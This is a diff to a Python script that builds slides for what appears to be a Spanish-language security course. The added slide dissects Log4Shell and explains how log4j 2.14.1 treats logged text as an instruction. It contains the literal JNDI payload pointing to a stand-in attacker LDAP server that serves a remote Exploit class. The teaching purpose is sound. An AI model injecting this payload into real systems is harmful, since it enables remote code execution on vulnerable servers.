@@ -153,6 +153,40 @@ save("incidentes", kicker("NO ES TEORÍA · 2021–2025") + h2("Tres golpes a la
     [20, 50, 30], size=24),
     "Los tres son la misma historia: el código propio estaba limpio y aún así cayeron. Por eso la sesión de hoy no es sobre tu app, es sobre todo lo que la rodea.", gap=24)
 
+_PAYLOAD = "${jndi:ldap://attacker-ldap:1389/Exploit}"
+
+
+def _seg(chip, label, col, tint):
+    return (f'<div style="display:flex;flex-direction:column;gap:10px;align-items:center">'
+            f'<div style="{MONO};font-size:27px;font-weight:600;color:{col};background:{tint};'
+            f'border:2px solid {col};border-radius:12px;padding:12px 16px;white-space:nowrap">{E(chip)}</div>'
+            f'<p style="font-size:18px;color:{MUTED};text-align:center;max-width:190px;line-height:1.2">{E(label)}</p></div>')
+
+
+_chain = '<div style="display:flex;gap:12px;align-items:center">' + (
+    '<x-shape kind="arrow-right" style="background:#E8893A;width:44px;height:26px"></x-shape>'.join(
+        f'<div style="flex:1;background:#FFFDF8;border:2px solid #D9D4C7;border-radius:14px;padding:18px;text-align:center">'
+        f'<p style="{MONO};font-size:19px;color:{ORANGE_D}">{a}</p>'
+        f'<p style="font-size:21px;color:{INK};line-height:1.25;margin-top:6px">{b}</p></div>'
+        for a, b in [("1", "el texto llega a <b>log.info()</b>"),
+                     ("2", "log4j ve <b>${jndi}</b> y lo resuelve"),
+                     ("3", "LDAP→HTTP: baja <b>Exploit.class</b>"),
+                     ("4", "la JVM la carga → <b>RCE</b>")])) + '</div>'
+
+save("jndi", kicker("CÓMO FUNCIONA LOG4SHELL") + h2("Anatomía de una sola cadena de texto", size=52) +
+     f'<div style="{MONO};font-size:34px;color:{INK};background:#FFFDF8;border:2px solid #D9D4C7;border-radius:14px;padding:20px 26px;text-align:center">{E(_PAYLOAD)}</div>' +
+     '<div style="display:flex;gap:14px;justify-content:space-between">' +
+     _seg("${", "lookup de log4j", ORANGE_D, "#FBEBDD") +
+     _seg("jndi:", "la API JNDI de Java", BLUE, "#E7F0F8") +
+     _seg("ldap://", "por el protocolo LDAP", "#6D4FA3", "#EFEAF7") +
+     _seg("attacker-ldap:1389", "servidor del atacante", RED, "#FBE9E9") +
+     _seg("/Exploit", "clase remota a cargar", RED, "#FBE9E9") +
+     _seg("}", "cierra el lookup", MUTED, "#F0EEE6") +
+     '</div>' + _chain +
+     p("Le dice a log4j: «ve por LDAP a ese servidor, pide <code>Exploit</code> y carga lo que te devuelva». log4j 2.14.1 <b>obedece</b>: trató un <b>dato</b> (lo que iba a loguear) como una <b>instrucción</b>. Mismo patrón que la inyección de prompts.", 27),
+     "El corazón técnico de Log4Shell. La idea que debe quedar: no es un comando ni un binario, es texto que parece inofensivo y pasa cualquier validación. Basta con que llegue a un log. El fix de 2.17 fue dejar de interpretar ${jndi:} dentro de los mensajes. Conecta con la sesión 5: confundir dato con orden es la misma falla en LLM.",
+     gap=22)
+
 # ================================================================ S3 El gate
 section("s3", "El gate determinista de Auditgate: bloquea solo lo nuevo, mismo motor en tu máquina y en CI")
 save("auditgate", kicker("5:30 · LA RESPUESTA") +
